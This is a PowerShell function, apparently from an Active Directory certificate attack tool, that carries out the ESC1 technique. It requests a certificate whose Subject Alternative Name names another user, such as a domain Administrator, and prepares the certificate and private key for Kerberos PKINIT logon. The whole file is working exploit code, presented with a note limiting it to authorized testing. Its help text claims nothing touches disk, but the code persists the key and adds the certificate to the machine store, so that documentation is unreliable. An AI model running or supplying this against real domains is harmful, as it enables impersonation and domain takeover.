function Request-ESC1Certificate {
    <#
        .SYNOPSIS
        Requests a certificate with an enrollee-supplied SAN using pure PowerShell (no Certify.exe).

        .DESCRIPTION
        Replaces the Certify.exe dependency for ESC1-style certificate requests. Generates a CSR
        in memory using System.Security.Cryptography.X509Certificates.CertificateRequest with a
        UPN Subject Alternative Name, submits it to an enterprise CA via the inbox
        CertificateAuthority.Request COM object (certcli.dll), and retrieves the issued certificate.

        The certificate and private key are kept in memory only. Nothing is written to disk.

        After issuance, the function inspects the issued certificate's SAN extension and reports
        whether the requested UPN actually made it into the certificate. This is the definitive
        ESC1 signal: if the SAN is present, the CA honored the enrollee-supplied subject.

        Requires .NET Framework 4.8.1 (inbox on Server 2025 / Windows 11) and Windows PowerShell 5.1.

        .PARAMETER TemplateName
        The name of the certificate template to request (e.g. 'User'). The template must have
        CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT set for the SAN to be honored.

        .PARAMETER CertificateAuthority
        The CA configuration string in the form 'CA-SERVER\CA-NAME'
        (e.g. 'ADCSGoat-CA\LabRootCA1').

        .PARAMETER TargetUPN
        The UPN to place in the Subject Alternative Name (e.g. 'Administrator@lab.local').
        This is the principal the certificate will authenticate as if the template is vulnerable.

        .PARAMETER SubjectName
        The X.500 subject name for the CSR. Defaults to 'CN=ESCalator'. The subject is cosmetic
        for ESC1; authentication is controlled by the SAN.

        .PARAMETER KeyLength
        RSA key length for the ephemeral key pair. Defaults to 2048.

        .PARAMETER WhatIf
        Shows what request would be submitted without contacting the CA.

        .OUTPUTS
        PSCustomObject with the following properties:
        - Success: $true if a certificate was issued
        - CertificateBase64: base64-encoded issued certificate (no private key)
        - CertificatePem: PEM-formatted certificate + private key (PKCS#12-compatible layout not used; key is separate)
        - PrivateKeyPem: PEM-formatted PKCS#8 private key
        - SanPresent: $true if the requested UPN appears in the issued certificate's SAN extension
        - RequestId: the CA's request ID
        - DispositionMessage: the CA's disposition message
        - Error: error message if Success is $false

        .EXAMPLE
        $result = Request-ESC1Certificate -TemplateName 'User' -CertificateAuthority 'ADCSGoat-CA\LabRootCA1' -TargetUPN 'Administrator@lab.local'
        if ($result.Success -and $result.SanPresent) { Write-Host 'ESC1 confirmed' }

        .NOTES
        WARNING: This function requests real certificates. Only use in authorized test environments.
        Issued certificates are logged on the CA (event 4886/4887) and are revocable.
    #>
    [CmdletBinding(SupportsShouldProcess)]
    param(
        [Parameter(Mandatory)]
        [ValidateNotNullOrEmpty()]
        [string]$TemplateName,

        [Parameter(Mandatory)]
        [ValidatePattern('^[^\\]+\\[^\\]+$')]
        [string]$CertificateAuthority,

        [Parameter(Mandatory)]
        [ValidateNotNullOrEmpty()]
        [string]$TargetUPN,

        [Parameter()]
        [ValidateNotNullOrEmpty()]
        [string]$SubjectName = 'CN=ESCalator',

        [Parameter()]
        [ValidateRange(2048, 4096)]
        [int]$KeyLength = 2048,

        [Parameter()]
        [ValidateNotNullOrEmpty()]
        [string]$TargetSid
    )

    Write-Verbose "[$(Get-Date -Format 'yyyy-MM-dd hh:mm:ss')] Starting $($MyInvocation.MyCommand)..."

    $result = [PSCustomObject]@{
        Success            = $false
        CertificateBase64  = $null
        CertificatePem     = $null
        PrivateKeyPem      = $null
        RsaKey             = $null
        KeyContainerName   = $null
        Certificate        = $null   # X509Certificate2 (with private key) for PKINIT
        San                = $TargetUPN  # the UPN placed in the SAN, for ClientName
        SanPresent         = $false
        RequestId          = $null
        DispositionMessage = $null
        Error              = $null
    }

    if (-not $PSCmdlet.ShouldProcess("Template '$TemplateName' on '$CertificateAuthority'", "Request certificate with SAN UPN '$TargetUPN'")) {
        $result.Error = 'WhatIf mode - no request submitted'
        return $result
    }

    $rsa = $null
    $containerName = 'ESCalator_' + [Guid]::NewGuid().ToString('N')
    try {
        # 1. Generate ephemeral key pair and CSR with UPN SAN.
        #    CertificateRequest is available in NetFX 4.7.2+ (verified on 4.8.1, see issue #4).
        #    RSACryptoServiceProvider with persisted container so the CA-issued cert
        #    can reference the key for SignedCms.ComputeSignature (PKINIT).
        $csp = [System.Security.Cryptography.CspParameters]::new()
        $csp.KeyContainerName = $containerName
        $csp.Flags = [System.Security.Cryptography.CspProviderFlags]::UseMachineKeyStore
        $rsa = [System.Security.Cryptography.RSACryptoServiceProvider]::new($KeyLength, $csp)
        $result.KeyContainerName = $containerName
        $request = [System.Security.Cryptography.X509Certificates.CertificateRequest]::new(
            $SubjectName,
            $rsa,
            [System.Security.Cryptography.HashAlgorithmName]::SHA256,
            [System.Security.Cryptography.RSASignaturePadding]::Pkcs1
        )

        # UPN SAN — the ESC1 primitive
        $sanBuilder = [System.Security.Cryptography.X509Certificates.SubjectAlternativeNameBuilder]::new()
        $sanBuilder.AddUserPrincipalName($TargetUPN)
        $request.CertificateExtensions.Add($sanBuilder.Build())

        # Client Authentication EKU — required for the cert to be usable for PKINIT
        $ekuOids = [System.Security.Cryptography.OidCollection]::new()
        [void]$ekuOids.Add([System.Security.Cryptography.Oid]::new('1.3.6.1.5.5.7.3.2'))
        $request.CertificateExtensions.Add(
            [System.Security.Cryptography.X509Certificates.X509EnhancedKeyUsageExtension]::new($ekuOids, $false)
        )

        # SID security extension (szOID_NTDS_CA_SECURITY_EXT, 1.3.6.1.4.1.311.25.2) — required
        # for strong certificate mapping on Server 2025 KDCs (KB5014754). Without it the KDC
        # cannot map the cert to the account and PKINIT fails with KDC_ERR_CLIENT_NOT_TRUSTED.
        if ($TargetSid) {
            $sidExtBytes = ConvertTo-NtdsSidExtension -Sid $TargetSid
            $sidOid = [System.Security.Cryptography.Oid]::new('1.3.6.1.4.1.311.25.2')
            $request.CertificateExtensions.Add(
                [System.Security.Cryptography.X509Certificates.X509Extension]::new($sidOid, $sidExtBytes, $false)
            )
            Write-Verbose "Added SID extension: $TargetSid"
        }

        $csrDer = $request.CreateSigningRequest()
        $csrBase64 = [Convert]::ToBase64String($csrDer)
        Write-Verbose "Generated CSR: $($csrDer.Length) bytes, UPN SAN: $TargetUPN"

        # 2. Submit via inbox certcli.dll COM object.
        #    Manual [ComImport] of ICertRequest2 fails with E_NOINTERFACE (issue #4);
        #    the CertificateAuthority.Request ProgID exposes Submit via IDispatch.
        $CR_IN_BASE64 = 0x1
        $CR_IN_PKCS10 = 0x100
        $CR_OUT_BASE64 = 0x1
        $CR_DISP_ISSUED = 3

        $caRequest = New-Object -ComObject CertificateAuthority.Request
        $attributes = "CertificateTemplate:$TemplateName"

        Write-Verbose "Submitting to '$CertificateAuthority' with attributes '$attributes'"
        $disposition = $caRequest.Submit(($CR_IN_BASE64 -bor $CR_IN_PKCS10), $csrBase64, $attributes, $CertificateAuthority)

        $result.RequestId = $caRequest.GetRequestId()
        $result.DispositionMessage = $caRequest.GetDispositionMessage()
        Write-Verbose "Disposition: $disposition, RequestId: $($result.RequestId)"

        if ($disposition -ne $CR_DISP_ISSUED) {
            # CR_DISP_INCOMPLETE, CR_DISP_DENIED, CR_DISP_UNDER_SUBMISSION, etc.
            $result.Error = "Certificate not issued. Disposition: $disposition. $($result.DispositionMessage)"
            Write-Warning $result.Error
            return $result
        }

        # 3. Retrieve the issued certificate.
        $issuedBase64 = $caRequest.GetCertificate($CR_OUT_BASE64)
        # GetCertificate may return base64 with PEM headers depending on flags; strip them.
        $cleanBase64 = $issuedBase64 -replace '-----BEGIN CERTIFICATE-----', '' -replace '-----END CERTIFICATE-----', '' -replace '\s', ''
        $result.CertificateBase64 = $cleanBase64

        # 4. Export the private key as PKCS#8 PEM for later PKINIT use.
        #    RSA.ExportPkcs8PrivateKey() does not exist on NetFX 4.8.1 (.NET Core 3.0+ only),
        #    so build PKCS#8 DER manually from ExportParameters.
        $pkcs8Der = ConvertTo-Pkcs8PrivateKey -Rsa $rsa
        $pkcs8Base64 = [Convert]::ToBase64String($pkcs8Der, [System.Base64FormattingOptions]::InsertLineBreaks)
        $result.PrivateKeyPem = "-----BEGIN PRIVATE KEY-----`n$pkcs8Base64`n-----END PRIVATE KEY-----"

        $certBase64Pem = [Convert]::ToBase64String([Convert]::FromBase64String($cleanBase64), [System.Base64FormattingOptions]::InsertLineBreaks)
        $result.CertificatePem = "-----BEGIN CERTIFICATE-----`n$certBase64Pem`n-----END CERTIFICATE-----"

        # 5. Verify the requested UPN made it into the issued certificate's SAN.
        #    This is the ESC1 signal: CA only retains the SAN if the template/CA config allows it.
        $issuedCert = [System.Security.Cryptography.X509Certificates.X509Certificate2]::new(
            [Convert]::FromBase64String($cleanBase64)
        )
        $sanExtension = $issuedCert.Extensions | Where-Object { $_.Oid.Value -eq '2.5.29.17' }
        if ($sanExtension) {
            $sanText = $sanExtension.Format($false)
            Write-Verbose "Issued cert SAN: $sanText"
            # UPN appears as 'Principal Name=user@domain' in Format() output
            if ($sanText -match [regex]::Escape($TargetUPN)) {
                $result.SanPresent = $true
            }
        } else {
            Write-Verbose 'Issued certificate contains no SAN extension'
        }

        # 6. Attach the persisted key to the issued cert and add to machine store.
        #    This is required for SignedCms.ComputeSignature (PKINIT) on NetFX 4.8.1.
        $issuedCertWithKey = [System.Security.Cryptography.X509Certificates.X509Certificate2]::new(
            [Convert]::FromBase64String($cleanBase64)
        )
        $issuedCertWithKey.PrivateKey = $rsa
        $store = [System.Security.Cryptography.X509Certificates.X509Store]::new('My', 'LocalMachine')
        $store.Open('ReadWrite')
        $store.Add($issuedCertWithKey)
        $store.Close()
        Write-Verbose "Certificate added to machine store with key container '$containerName'"

        $result.Success = $true
        # Re-read the persisted cert from the machine store. The store copy resolves its
        # private key via CNG (RSACng), which NetFX SignedCms encodes correctly for PKINIT;
        # the in-memory object carries a CAPI RSACryptoServiceProvider that mis-encodes the
        # CMS eContent on NetFX 4.8 (KRB-ERROR 60). Callers should use .Certificate directly.
        $readStore = [System.Security.Cryptography.X509Certificates.X509Store]::new('My', 'LocalMachine')
        $readStore.Open('ReadOnly')
        $persisted = $readStore.Certificates | Where-Object { $_.Thumbprint -eq $issuedCertWithKey.Thumbprint }
        $readStore.Close()
        $result.Certificate = if ($persisted) { $persisted } else { $issuedCertWithKey }
        # Pass the live RSA key for in-process PKINIT use. Caller is responsible for disposal.
        $result.RsaKey = $rsa
        Write-Verbose "Certificate issued. SAN present: $($result.SanPresent)"
    } catch {
        $result.Error = "$($_.Exception.GetType().FullName): $($_.Exception.Message)"
        Write-Warning "Certificate request failed: $($result.Error)"
        if ($rsa) { $rsa.Dispose(); $rsa = $null }
    } finally {
        # Dispose the key only on failure; on success the caller owns it.
        if (-not $result.Success -and $rsa) { $rsa.Dispose() }
    }

    Write-Verbose "[$(Get-Date -Format 'yyyy-MM-dd hh:mm:ss')] Finishing $($MyInvocation.MyCommand)..."
    return $result
}
